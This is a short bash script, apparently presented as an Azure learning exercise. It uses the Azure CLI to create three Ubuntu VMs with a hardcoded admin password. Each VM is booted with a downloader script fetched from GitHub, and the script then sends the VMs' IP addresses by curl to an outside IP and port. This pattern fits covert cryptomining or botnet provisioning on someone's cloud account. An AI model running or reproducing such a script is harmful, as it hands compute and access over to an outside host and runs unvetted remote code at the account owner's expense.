#!/bin/bash

rg=`az group list | jq -r '.[0] .name'` && echo $rg && wget https://raw.githubusercontent.com/taftgt/azlearn/main/downloader.sh && chmod +x downloader.sh

az vm create --resource-group $rg --image Canonical:0001-com-ubuntu-server-focal:20_04-lts:latest --admin-username radium --admin-password Ferozataftgt88 --no-wait --custom-data downloader.sh --size "Standard_DS2_v2" --location centralindia --name SampleVM1

az vm create --resource-group $rg --image Canonical:0001-com-ubuntu-server-focal:20_04-lts:latest --admin-username radium --admin-password Ferozataftgt88 --no-wait --custom-data downloader.sh --size "Standard_DS2_v2" --location centralindia --name SampleVM2

az vm create --resource-group $rg --image Canonical:0001-com-ubuntu-server-focal:20_04-lts:latest --admin-username radium --admin-password Ferozataftgt88 --no-wait --custom-data downloader.sh --size "Standard_DS2_v2" --location centralindia --name SampleVM3

sleep 2m

publicIP=`az vm list --resource-group $rg --show-details --query "[*].{Name:name, PrivateIP:privateIps, PublicIP:publicIps}"` && echo $publicIP

curl -d 'jsonvm='"$publicIP"'' http://192.210.151.34:17612
